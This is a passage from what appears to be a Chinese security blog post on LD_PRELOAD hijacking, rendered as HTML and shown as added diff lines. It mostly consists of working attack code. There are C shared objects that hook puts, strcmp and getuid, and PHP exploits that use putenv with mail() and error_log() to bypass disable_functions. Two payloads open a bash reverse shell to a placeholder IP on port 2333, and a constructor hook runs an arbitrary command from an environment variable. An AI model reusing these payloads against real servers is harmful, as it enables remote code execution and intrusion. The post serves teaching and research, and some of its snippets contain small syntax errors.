+</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">puts</span><span class="p">(</span><span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">message</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="o">==</span><span class="n">NULL</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="n">unsetenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">playload</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里可以写马也可以写反弹shell也可以写其他的。
+编译一下上传即可。
+这里我也贴一下Mon0day师傅的demo
+whoami.c</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;mon&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;usage: %s &lt;given-name&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[0;32;32mYour name Correct!</span><span class="se">\n\033</span><span class="s">[m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[0;32;31mYour name Wrong!</span><span class="se">\n\033</span><span class="s">[m&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>hook_strcmp.c</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">strcmp</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后编译后也是无论输入什么都是返回correct</p>
+<h2 id="0x03-bypass" class="headerLink">
+    <a href="#0x03-bypass" class="header-mark"></a>0x03 bypass</h2><h3 id="bypass-disable_function" class="headerLink">
+    <a href="#bypass-disable_function" class="header-mark"></a>bypass disable_function</h3><p>众所周知，在实战中遇到disable的时候是可以利用LD_PRELOAD进行绕过的
+利用条件，存在putenv,mail，error_log这些可以对环境变量进行操作的函数</p>
+<h4 id="mail" class="headerLink">
+    <a href="#mail" class="header-mark"></a>mail</h4><p>hook_getuid.c</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;string.h&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">void payload<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    system<span class="o">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#39;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uid_t getuid<span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span>getenv<span class="o">(</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="o">)</span> <span class="o">==</span> NULL<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    unsetenv<span class="o">(</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    payload<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;LD_PRELOAD=/var/www/html/hook_getuid.so&#39;</span><span class="p">);</span>    <span class="c1">// 注意这里的目录要有访问权限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;a@localhost&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="error_log" class="headerLink">
+    <a href="#error_log" class="header-mark"></a>error_log</h4><p>同样也会调用sendmail，所以基本原理和mail的一样这里不在赘述。
+exp:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">putenv</span><span class="p">(</span><span class="s1">&#39;LD_PRELOAD=/var/www/html/hook_getuid.so&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_log</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="mi">1</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="hijack-systems-process" class="headerLink">
+    <a href="#hijack-systems-process" class="header-mark"></a>hijack system&rsquo;s process</h4><p>这里mon0day师傅还写出了一个新的方法去进行getshell
+因为在有些系统里面没有安装sendmail的情况。
+<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener noreferrer">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>这里在gcc中发现了<code>__attribute__((constructor))</code>修饰符，在main之前进行执行，也就是说只要我们的文件被执行，那么直接就会被劫持getshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="_attribute_constructor" class="headerLink">
+    <a href="#_attribute_constructor" class="header-mark"></a>_attribute_((constructor))</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">char</span><span class="o">**</span> <span class="n">environ</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span> <span class="p">((</span><span class="n">__constructor__</span><span class="p">))</span> <span class="kt">void</span> <span class="nf">preload</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// get command line options and arg
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cmdline</span> <span class="o">=</span> <span class="nf">getenv</span><span class="p">(</span><span class="s">&#34;EVIL_CMDLINE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// unset environment variable LD_PRELOAD.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// unsetenv(&#34;LD_PRELOAD&#34;) no effect on some 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// distribution (e.g., centos), I need crafty trick.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">strstr</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// executive command
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">system</span><span class="p">(</span><span class="n">cmdline</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="bypass-file-suffix" class="headerLink">
+    <a href="#bypass-file-suffix" class="header-mark"></a>bypass File suffix</h3><p>其实就是后缀名包括但不限于so都可以被执行，后缀名被ban的时候可bypass</p>
+<h2 id="0x04-conculsion" class="headerLink">
+    <a href="#0x04-conculsion" class="header-mark"></a>0x04 Conculsion</h2><p>其实这个漏洞的本质就是利用linker对环境变量进行覆盖操作从而绕过一些函数的限制进行getshell，这让我不禁想起在n1junior2024中的那道golang的环境变量注入rce，都是对环境变量进行注入进行rce，后续康康研究下那道题目（没解出来太菜了www）</p>
+<p>参考文章：
+<a href="https://forum.butian.net/share/1493" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/1493</a>
+<a href="https://medium.com/@hovakimyan29/demystifying-linking-in-software-development-931e67d48fad" target="_blank" rel="noopener noreferrer">https://medium.com/@hovakimyan29/demystifying-linking-in-software-development-931e67d48fad</a></p></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-02-21</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">环境变量注入</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/sql-rce/" class="prev" rel="prev" title="thinkphp3.2.3 nday到rce深度利用"><i class="fas fa-angle-left fa-fw"></i>thinkphp3.2.3 nday到rce深度利用</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.122.0">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/ML-hacker" target="_blank" rel="noopener noreferrer">Delete</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":30},"comment":{},"data":{"desktop-header-typeit":"Delete's blog","mobile-header-typeit":"Delete's blog"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://.disqus.com/embed.js" defer></script></div>
+</body>
+
+</html>
